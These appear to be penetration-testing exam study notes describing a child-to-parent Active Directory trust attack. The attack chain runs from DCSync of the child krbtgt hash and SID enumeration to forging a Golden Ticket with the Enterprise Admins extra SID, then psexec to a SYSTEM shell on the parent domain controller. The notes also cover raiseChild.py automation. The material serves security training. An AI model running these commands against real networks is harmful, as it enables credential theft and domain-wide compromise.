# Attacking Domain Trusts: Child → Parent (Linux)

## 1. Attack Overview

If a child domain is compromised, an attacker can potentially escalate privileges to the **parent domain** by forging a Golden Ticket containing the parent forest's **Enterprise Admins SID**.

**Requirements:**
- Child domain `krbtgt` NTLM hash.
- Child domain SID.
- Child domain FQDN.
- Target username (does not need to exist).
- Parent domain Enterprise Admins SID.

**Attack flow:**
1. Obtain the child domain's `krbtgt` hash using DCSync.
2. Enumerate the child domain SID.
3. Enumerate the parent domain SID.
4. Append RID `519` to the parent SID to obtain the Enterprise Admins SID.
5. Forge a Golden Ticket using `ticketer.py`.
6. Export the ticket through `KRB5CCNAME`.
7. Authenticate to the parent DC using Kerberos.

---

## 2. Obtain the Child Domain KRBTGT Hash

**Tool:** `secretsdump.py`

```bash
secretsdump.py <child-domain>/<user>@<child-dc-ip> -just-dc-user <NETBIOS-DOMAIN>/krbtgt
```

**Key point:** `-just-dc-user` limits credential extraction to the specified account.

Record the child domain's `krbtgt` NTLM hash.

---

## 3. Enumerate Domain SIDs

### Child Domain SID

**Tool:** `lookupsid.py`

```bash
lookupsid.py <domain>/<user>@<child-dc-ip> | grep "Domain SID"
```

Example output:

```text
Domain SID: S-1-5-21-2806153819-209893948-922872689
```

### Parent Domain SID

Query the parent DC:

```bash
lookupsid.py <domain>/<user>@<parent-dc-ip> | grep -B12 "Enterprise Admins"
```

The output provides the parent domain SID and the Enterprise Admins group RID.

**Important:**
- Enterprise Admins RID = `519`
- Enterprise Admins SID = `<PARENT-DOMAIN-SID>-519`

Example:

```text
Parent SID: S-1-5-21-3842939050-3880317879-2865463114
Enterprise Admins SID: S-1-5-21-3842939050-3880317879-2865463114-519
```

---

## 4. Forge a Golden Ticket

**Tool:** `ticketer.py`

```bash
ticketer.py \
  -nthash <CHILD-KRBTGT-NTLM-HASH> \
  -domain <CHILD-DOMAIN-FQDN> \
  -domain-sid <CHILD-DOMAIN-SID> \
  -extra-sid <PARENT-ENTERPRISE-ADMINS-SID> \
  <TARGET-USERNAME>
```

Example target username: `hacker` (does not need to exist).

**Key parameters:**

| Parameter | Purpose |
|---|---|
| `-nthash` | Child domain's KRBTGT NTLM hash |
| `-domain` | Child domain FQDN |
| `-domain-sid` | Child domain SID |
| `-extra-sid` | Parent Enterprise Admins SID |
| Target username | Username embedded in the forged ticket |

**Output:** A Kerberos credential cache file, such as `hacker.ccache`.

---

## 5. Load the Kerberos Ticket

```bash
export KRB5CCNAME=hacker.ccache
```

`KRB5CCNAME` tells Kerberos-enabled tools which credential cache to use.

---

## 6. Authenticate to the Parent Domain DC

**Tool:** `psexec.py`

```bash
psexec.py <CHILD-DOMAIN-FQDN>/<TARGET-USER>@<PARENT-DC-FQDN> \
  -k -no-pass -target-ip <PARENT-DC-IP>
```

**Flags:**
- `-k` — Use Kerberos authentication.
- `-no-pass` — Do not prompt for a password.
- `-target-ip` — Specify the target's IP address.

**Successful result:** In the demonstrated HTB scenario, authentication provides a SYSTEM shell on the parent domain controller.

---

## 7. Automate the Attack with raiseChild.py

Impacket provides `raiseChild.py` to automate child-to-parent domain escalation.

```bash
raiseChild.py -target-exec <PARENT-DC-IP> <CHILD-DOMAIN-FQDN>/<CHILD-ADMIN>
```

The tool automates:
1. Identifying the child and forest domains.
2. Retrieving the parent Enterprise Admins SID.
3. Obtaining the child KRBTGT credentials.
4. Creating a Golden Ticket.
5. Retrieving target account credentials.
6. Optionally launching a PsExec shell.

**Exam tip:** Understand the manual workflow even when an automated tool is available. Automation can fail, and knowing each step helps identify missing prerequisites.

---

## 8. Quick Exam Reference

| Item | Remember |
|---|---|
| Extract KRBTGT hash | `secretsdump.py` |
| Enumerate domain SID | `lookupsid.py` |
| Forge Golden Ticket | `ticketer.py` |
| Load Kerberos cache | `export KRB5CCNAME=<ticket.ccache>` |
| Authenticate using Kerberos | `psexec.py -k -no-pass` |
| Automate child-to-parent escalation | `raiseChild.py` |
| Enterprise Admins RID | `519` |
| Ticket's parent-domain privilege SID | Parent domain SID + `-519` |

### Important Distinction

- `-domain-sid` specifies the **child domain SID**.
- `-extra-sid` specifies the **parent Enterprise Admins SID**.
- The forged ticket uses the child domain's KRBTGT secret and includes the parent group's SID.

**Operational caution:** In authorized assessments, understand and validate each step before using automation, especially in production environments.
